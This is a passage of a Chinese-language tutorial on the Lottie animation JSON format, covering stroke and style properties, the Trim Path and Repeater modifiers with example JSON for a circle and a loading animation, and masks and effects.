<li><strong><code>w</code> (Width)</strong> ：描边的粗细，支持动画。</li>
<li><strong><code>lc</code> (Line Cap)</strong> ：定义线段端点的样式。</li>
<li><strong><code>lj</code> (Line Join)</strong> ：定义线段转折处的连接样式。</li>
<li><strong><code>ml</code> (Miter Limit)</strong> ：当 <code>lj</code> 为 1 (斜接) 时，控制斜接长度与线宽的比例上限，防止尖角过长。</li>
</ul>
<h4 data-id="heading-36"><strong>渐变描边（<code>ty</code>: 'gs'）</strong></h4>
<p>渐变描边的数据结构与渐变填充 (<code>gf</code>) 高度相似，包含 <code>t</code> (类型)、<code>g</code> (渐变数据) 等属性，区别在于它应用于轮廓线而非填充区域。</p>
<h3 data-id="heading-37"><strong>样式的通用属性</strong></h3>
<p>填充和描边共享一些控制其最终呈现效果的通用属性：</p>




















<table><thead><tr><th>属性</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><strong><code>o</code></strong></td><td><code>object</code></td><td><strong>不透明度 (Opacity)</strong> 。通过 <code>a</code> 和 <code>k</code> 控制，<strong>值范围为 0 到 100</strong>（100 为完全不透明）。这与 CSS 中 0-1 的范围不同，请注意区分。</td></tr><tr><td><strong><code>bm</code></strong></td><td><code>number</code></td><td><strong>混合模式 (Blend Mode)</strong> 。定义当前样式如何与下方已有的像素进行混合。常见值：<code>0</code> (正常)、<code>1</code> (相乘)、<code>2</code> (屏幕) 等，对应 After Effects 中的混合模式。</td></tr></tbody></table>
<h3 data-id="heading-38">🎨小试牛刀：画个圆</h3>
<p>现在，让我们综合运用以上概念，创建一个最简单的形状：<strong>一个蓝色的实心圆</strong>。我们将通过 JSON 配置，清晰地展示形状图层的 <code>shapes</code> 数组是如何组织起来的。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5733db6d3a25461f92ca58eb48742101~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=atYsH7mr0D%2BItQkxiTEoGqbKwpk%3D" alt="image.png" width="50%" loading="lazy"/></p>
<p>以下是实现该圆形的<strong>精简版 JSON 配置</strong>，我们省略了前面章节已详细讲解的通用图层属性（如 <code>ks</code> 变换），将焦点完全放在形状图层特有的 <code>shapes</code> 数组上：</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-string">"v"</span>: <span class="hljs-string">"5.7.4"</span>,
  <span class="hljs-string">"fr"</span>: <span class="hljs-number">30</span>,
  <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,
  <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,
  <span class="hljs-string">"w"</span>: <span class="hljs-number">800</span>,
  <span class="hljs-string">"h"</span>: <span class="hljs-number">600</span>,
  <span class="hljs-string">"layers"</span>: [
    {
      <span class="hljs-string">"ty"</span>: <span class="hljs-number">4</span>, <span class="hljs-comment">// ⭐️ 核心标识：这是一个形状图层</span>
      <span class="hljs-string">"nm"</span>: <span class="hljs-string">"带描边圆形"</span>,
      <span class="hljs-string">"ind"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-comment">// 🔽 此处省略了图层的 `ks` 变换属性（如 p, a, s, r, o）</span>
      <span class="hljs-comment">// 在完整文件中，它们用于将整个图层定位在画布中心，例如：</span>
      <span class="hljs-comment">// "ks": { "p": { "a": 0, "k": [400, 300, 0] }, ... }</span>
      
      <span class="hljs-string">"shapes"</span>: [ <span class="hljs-comment">// ⭐️ 本章核心：形状与样式数组</span>
        {
          <span class="hljs-string">"ty"</span>: <span class="hljs-string">"gr"</span>, <span class="hljs-comment">// 类型：gr (Group)，一个形状组</span>
          <span class="hljs-string">"nm"</span>: <span class="hljs-string">"圆形组"</span>,
          <span class="hljs-string">"it"</span>: [ <span class="hljs-comment">// 组内元素列表，按索引顺序 0→1→2→3 渲染</span>
            <span class="hljs-comment">// 1. 形状定义：椭圆 (el) - 先绘制，定义几何轮廓</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"el"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"椭圆路径"</span>,
              <span class="hljs-string">"p"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] }, <span class="hljs-comment">// 位置：相对于组的中心</span>
              <span class="hljs-string">"s"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">100</span>, <span class="hljs-number">100</span>] } <span class="hljs-comment">// 尺寸：宽高100px，即圆形</span>
            },
            <span class="hljs-comment">// 2. 样式定义：填充 (fl) - 其次绘制，为形状内部着色</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"fl"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"蓝色填充"</span>,
              <span class="hljs-string">"c"</span>: { 
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, 
                <span class="hljs-string">"k"</span>: [<span class="hljs-number">0.2</span>, <span class="hljs-number">0.6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>] <span class="hljs-comment">// 颜色：RGBA，此为蓝色</span>
              },
              <span class="hljs-string">"o"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: <span class="hljs-number">100</span> } <span class="hljs-comment">// 不透明度：100%</span>
            },
            <span class="hljs-comment">// 3. 样式定义：描边 (st) - 最后绘制，为形状轮廓添加边线</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"st"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"白色描边"</span>,
              <span class="hljs-string">"c"</span>: { 
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, 
                <span class="hljs-string">"k"</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>] <span class="hljs-comment">// 颜色：白色</span>
              },
              <span class="hljs-string">"w"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: <span class="hljs-number">5</span> }, <span class="hljs-comment">// 线宽：5像素</span>
              <span class="hljs-string">"lc"</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// 线帽：2 = 圆头</span>
              <span class="hljs-string">"lj"</span>: <span class="hljs-number">2</span>  <span class="hljs-comment">// 连接：2 = 圆角</span>
            },
            <span class="hljs-comment">// 4. 必需的组变换 (tr) - 必须放在最后，控制整个组的变换</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"tr"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"组变换"</span>
              <span class="hljs-comment">// 其内部属性 (p, a, s, r, o) 通常保持默认值 [0, 0, 100, 0, 100]</span>
            }
          ]
        }
      ]
    }
  ]
}
</code></pre>
<hr/>
<h2 data-id="heading-39"><strong>七、形状修改器 - Trim、Repeater</strong></h2>
<p>在掌握了形状的构建与样式之后，我们迎来了形状系统的最后一块拼图：<strong>修改器（Modifiers）</strong> 。它们不是独立形状，而是<strong>附加在现有形状或组之上</strong>的“效果处理器”，能够以非破坏性的方式动态改变图形的外观或行为，是实现复杂、程式化动画的关键。</p>
<h3 data-id="heading-40"><strong>修改器的概念：作用范围与顺序</strong></h3>
<p>修改器是一种特殊类型的元素，其 <code>ty</code> 值定义在 <code>shapes</code> 或 <code>it</code> 数组中。它们<strong>不直接渲染</strong>，而是像一个处理器，<strong>作用于排列在它之前的特定元素</strong>。</p>
<ul>
<li><strong>作用逻辑</strong>：在 <code>it</code> 数组中，修改器按照<strong>从前往后</strong>的顺序执行，每个修改器会作用于它<strong>之前已定义</strong>的特定元素。例如，<code>Trim Path</code> 裁剪其之前的路径，<code>Repeater</code> 重复其之前的整个形状组合。</li>
<li><strong>顺序关键</strong>：修改器的<strong>位置</strong>决定了其作用范围和最终效果。例如，<code>[形状 → 样式 → Trim]</code> 会裁剪已着色的形状；而 <code>[形状 → Trim → 样式]</code> 会先裁剪路径，再为裁剪后的部分着色。</li>
</ul>
<h3 data-id="heading-41"><strong>Trim Path（<code>tm</code>）：路径裁剪动画</strong></h3>
<p><code>Trim Path</code>（路径裁剪）是最常用的修改器之一，它通过控制路径的“起止点”来创造<strong>笔触绘制、擦除、扫描</strong>等动画效果。</p>
<p><strong>核心属性：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tm"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 类型：Trim Paths</span>
  <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Start（起点百分比）</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">90</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 从0%到100%</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"e"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// End（终点百分比）</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">90</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 保持100%</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Offset（偏移）</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span> <span class="hljs-comment">// 范围0-360°，整体偏移裁剪区域</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>s</code> (Start)</strong> ：路径可见部分的<strong>起点</strong>，范围 0-100%。动画化此属性可实现“生长”动画。</li>
<li><strong><code>e</code> (End)</strong> ：路径可见部分的<strong>终点</strong>，范围 0-100%。通常 <code>e</code> &gt;= <code>s</code>。</li>
<li><strong><code>o</code> (Offset)</strong> ：<strong>裁剪区域的整体偏移量</strong>，范围 0-360°。它可以让裁剪的起止点沿路径循环移动，常用于创建“追逐”或“循环扫描”效果。</li>
</ul>
<p><strong>典型应用</strong>：通过动画 <code>s</code> 和 <code>e</code> 属性，可以实现经典的“笔画书写”或“进度条填充”效果。</p>
<h3 data-id="heading-42"><strong>Repeater（<code>rp</code>）：重复器</strong></h3>
<p><code>Repeater</code>（重复器）能将<strong>它之前的所有图形元素</strong>（包括形状、样式甚至其他修改器）复制多次，并对每个副本应用递增的变换，快速创建<strong>阵列、放射状、循环</strong>等复杂图案。</p>
<p><strong>核心属性：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"rp"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 类型：Repeater</span>
  <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Copies（副本数量）</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span> <span class="hljs-comment">// 生成5个副本（包含原始图形）</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Offset（副本索引偏移）</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span> <span class="hljs-comment">// 控制从哪个“虚拟副本”开始渲染，可用于动画</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"m"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// Composite（合成模式）：1=Above（后续副本在上方），2=Below（后续副本在下方）</span>
  <span class="hljs-attr">"tr"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Transform（每个副本的增量变换）</span>
    <span class="hljs-attr">"p"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">20</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 位置增量：每个副本右移20px</span>
    <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">90</span><span class="hljs-punctuation">,</span> <span class="hljs-number">90</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 缩放增量：每个副本缩小至90%</span>
    <span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">30</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span> <span class="hljs-comment">// 旋转增量：每个副本旋转30度</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>c</code> (Copies)</strong> ：生成的副本总数（包含原始图形）。</li>
<li><strong><code>o</code> (Offset)</strong> ：控制从哪个“虚拟副本”开始渲染，可用于动画。</li>
<li><strong><code>m</code> (Composite)</strong> ：控制副本的堆叠顺序。<code>1</code> 表示新副本叠在上方，<code>2</code> 表示新副本叠在下方。</li>
<li><strong><code>tr</code> (Transform)</strong> ：定义每个新副本相对于前一个副本的<strong>变换增量</strong>，是创造规律性变化的关键。</li>
</ul>
<h3 data-id="heading-43"><strong>其他修改器简介</strong></h3>
<p>除了上述两个，Lottie 还提供了其他实用的修改器来扩展图形能力：</p>























<table><thead><tr><th>类型标识 (<code>ty</code>)</th><th>名称</th><th>核心作用</th><th>关键属性与备注</th></tr></thead><tbody><tr><td><strong><code>rd</code></strong></td><td><strong>Round Corners</strong> (圆角)</td><td>将路径的所有尖角转换为指定半径的圆角。</td><td><code>r</code>：圆角半径。</td></tr><tr><td><strong><code>mm</code></strong></td><td><strong>Merge Paths</strong> (合并路径)</td><td>将多个路径合并为一个（类似布尔运算）。</td><td><code>mm</code>：合并模式（如相加、相减、交集等）。 ⚠️ <strong>注意</strong>：官方文档标注此功能<strong>目前不被支持</strong>，使用时需谨慎测试。</td></tr></tbody></table>
<h3 data-id="heading-44">🎨小试牛刀：loading动画</h3>
<p>让我们将学到的 <code>Trim Path</code> 知识应用到实践中，制作一个经典的 loading 动画。下面的示例将展示如何通过动画 <code>o</code>（偏移）属性来创建持续旋转的圆环进度效果。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e06b64b3e4dd48d5a36702fdcf93bca5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=98ongG8AtZhZAutA0JARGRteDZE%3D" alt="录屏2026-01-08 17.48.53.gif" width="50%" loading="lazy"/></p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-string">"v"</span>: <span class="hljs-string">"5.7.4"</span>,
  <span class="hljs-string">"fr"</span>: <span class="hljs-number">30</span>,
  <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,
  <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,
  <span class="hljs-string">"w"</span>: <span class="hljs-number">800</span>,
  <span class="hljs-string">"h"</span>: <span class="hljs-number">600</span>,
  <span class="hljs-string">"nm"</span>: <span class="hljs-string">"Trim Path演示"</span>,
  <span class="hljs-string">"layers"</span>: [
    {
      <span class="hljs-string">"ty"</span>: <span class="hljs-number">4</span>,
      <span class="hljs-string">"nm"</span>: <span class="hljs-string">"圆形绘制动画"</span>,
      <span class="hljs-string">"ind"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-string">"ks"</span>: {
        <span class="hljs-string">"p"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">400</span>, <span class="hljs-number">300</span>, <span class="hljs-number">0</span>] }
      },
      <span class="hljs-string">"shapes"</span>: [
        {
          <span class="hljs-string">"ty"</span>: <span class="hljs-string">"gr"</span>,
          <span class="hljs-string">"nm"</span>: <span class="hljs-string">"圆形组"</span>,
          <span class="hljs-string">"it"</span>: [
            <span class="hljs-comment">// 1. 圆形路径</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"el"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"圆形路径"</span>,
              <span class="hljs-string">"p"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] },
              <span class="hljs-string">"s"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">200</span>, <span class="hljs-number">200</span>] }
            },
            <span class="hljs-comment">// 2. 描边样式</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"st"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"描边"</span>,
              <span class="hljs-string">"c"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">0.2</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>] },
              <span class="hljs-string">"w"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: <span class="hljs-number">12</span> },
              <span class="hljs-string">"lc"</span>: <span class="hljs-number">2</span>,
              <span class="hljs-string">"lj"</span>: <span class="hljs-number">2</span>
            },
            <span class="hljs-comment">// 3. Trim Path 修改器 ⭐️</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"tm"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"Trim Path"</span>,
              <span class="hljs-string">"s"</span>: {  <span class="hljs-comment">// 起点百分比 (0-100)</span>
                <span class="hljs-string">"a"</span>: <span class="hljs-number">1</span>,
                <span class="hljs-string">"k"</span>: [
                  { <span class="hljs-string">"t"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"s"</span>: [<span class="hljs-number">0</span>], <span class="hljs-string">"e"</span>: [<span class="hljs-number">100</span>] },
                  { <span class="hljs-string">"t"</span>: <span class="hljs-number">90</span>, <span class="hljs-string">"s"</span>: [<span class="hljs-number">100</span>] }
                ]
              },
              <span class="hljs-string">"e"</span>: {  <span class="hljs-comment">// 终点百分比 (0-100)</span>
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">"k"</span>: <span class="hljs-number">100</span>
              },
              <span class="hljs-string">"o"</span>: {  <span class="hljs-comment">// 偏移角度 (0-360)</span>
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">"k"</span>: <span class="hljs-number">0</span>
              }
            },
            <span class="hljs-comment">// 4. 组变换</span>
            { <span class="hljs-string">"ty"</span>: <span class="hljs-string">"tr"</span> }
          ]
        }
      ]
    }
  ]
}
</code></pre>
<hr/>
<h2 data-id="heading-45"><strong>八、高级特性 - 蒙版、效果、表达式</strong></h2>
<p>本章将简要介绍 Lottie 中几个高级但常用的特性。理解这些概念有助于您阅读和分析更复杂的动画文件，但在实际创作中，请注意它们在不同平台和渲染器中的支持程度可能有所差异。</p>
<h3 data-id="heading-46"><strong>蒙版（Mask）：<code>masksProperties</code> 数组</strong></h3>
<p>蒙版用于控制图层的显示区域，实现剪切、遮罩等效果。在图层对象中，通过 <code>masksProperties</code> 数组定义。</p>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"masksProperties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"mode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"a"</span><span class="hljs-punctuation">,</span>           <span class="hljs-comment">// 蒙版模式：a=相加，s=相减，i=相交等</span>
    <span class="hljs-attr">"pt"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>                <span class="hljs-comment">// 路径（Path），定义蒙版形状</span>
      <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">,</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">,</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 不透明度（Opacity）</span>
    <span class="hljs-attr">"inv"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-comment">// 是否反转（Inverted）</span>
    <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"蒙版1"</span>                <span class="hljs-comment">// 名称（Name）</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<p><strong>关键属性：</strong></p>
<ul>
<li>
<p><strong><code>mode</code></strong>：蒙版混合模式。除了常用的 <code>"a"</code>（Add，相加）和 <code>"s"</code>（Subtract，相减），Lottie Schema 还定义了其他模式，但并非所有都被完全支持。</p>













































<table><thead><tr><th>模式代码</th><th>名称 (英文)</th><th>作用效果</th></tr></thead><tbody><tr><td><code>"n"</code></td><td>None (无)</td><td>禁用蒙版</td></tr><tr><td><code>"a"</code></td><td>Add (相加)</td><td>合并多个蒙版区域</td></tr><tr><td><code>"s"</code></td><td>Subtract (相减)</td><td>从现有区域中减去</td></tr><tr><td><code>"i"</code></td><td>Intersect (相交)</td><td>只保留蒙版重叠区域</td></tr><tr><td><code>"l"</code></td><td>Lighten (变亮)</td><td>保留较亮区域</td></tr><tr><td><code>"d"</code></td><td>Darken (变暗)</td><td>保留较暗区域</td></tr><tr><td><code>"f"</code></td><td>Difference (差异)</td><td>显示颜色差异区域</td></tr></tbody></table>
</li>
<li>
<p><strong><code>pt</code></strong>：蒙版路径，其数据结构（含 <code>v</code>, <code>i</code>, <code>o</code>）与形状图层中的自由路径（<code>sh</code>）完全相同。</p>
</li>
<li>
<p><strong><code>o</code></strong>：蒙版的不透明度。</p>
</li>
<li>
<p><strong><code>inv</code></strong>：布尔值，为 <code>true</code> 时反转蒙版区域。</p>
</li>
</ul>
<h3 data-id="heading-47"><strong>效果（Effects）：<code>ef</code> 数组</strong></h3>
<p>Lottie 支持部分 After Effects 内置效果，通过图层的 <code>ef</code> 数组定义。<strong>请注意，支持的效果非常有限，且并非所有AE效果都能被完美支持或渲染。</strong></p>
<p>根据官方 Schema 文档，有明确定义的效果类型包括：</p>
<ul>
<li><strong>填充</strong> (Fill): <code>ty: 21</code></li>
<li><strong>描边</strong> (Stroke): <code>ty: 22</code></li>
<li><strong>色调</strong> (Tint): <code>ty: 20</code></li>
<li><strong>三色调/专业色阶</strong> (Tritone/Pro Levels): <code>ty: 23</code></li>
</ul>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"ef"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">21</span><span class="hljs-punctuation">,</span>                 <span class="hljs-comment">// 效果类型：21 = 填充 (Fill)</span>
  <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"颜色叠加"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"en"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>                  <span class="hljs-comment">// 启用 (Enabled)</span>
  <span class="hljs-attr">"ef"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"颜色"</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span> <span class="hljs-comment">// 红色</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
</code></pre>
<blockquote>
